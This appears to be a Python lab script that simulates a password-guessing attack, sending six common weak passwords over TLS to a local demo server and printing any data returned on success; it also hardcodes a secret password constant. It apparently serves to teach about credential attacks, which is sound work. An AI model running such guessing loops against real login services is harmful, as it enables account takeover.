import socket
import ssl

SECRET = 'my_secret_password'

"""
Simple simulation of a possible credential stuffing attacks for regular passwords
Source <a href=https://owasp.org/www-community/attacks/Credential_stuffing />
"""
def credential_stuffing_attack():
    dictionary = ['password', '123456', 'strong_password', 'password123', 'qwerty', 'easypass']
    print("Starting credential stuffing simulation")
    for password in dictionary:  # trying from a list of dictionary of weak default passwords
        """
        SSL source code <a href=https://docs.python.domainunion.de/3/library/ssl.html />
        """
        HOST = 'localhost'
        PORT = 65433

        # Create a context for the secure connection
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.load_verify_locations('../server_cert.pem')  # Load the server's certificate to verify it

        # Wrap the socket in the SSL context
        with socket.create_connection((HOST, PORT)) as client_socket:
            with context.wrap_socket(client_socket, server_hostname=HOST) as secure_socket:
                secure_socket.send(password.encode())

                # Receive auth response
                response = secure_socket.recv(1024).decode()
                if response == "AUTH_SUCCESS":
                    print("Authentication Success")
                    print(f'stuffed password: {password}')
                    secure_socket.send("GET_DATA".encode())
                    data = secure_socket.recv(1024).decode()
                    print(f"Received data: {data}")
                else:
                    print(f'stuffed password: {password}')
                    print(f"Received data: {response}")
            secure_socket.close()
        client_socket.close()

if __name__ == "__main__":
    credential_stuffing_attack()
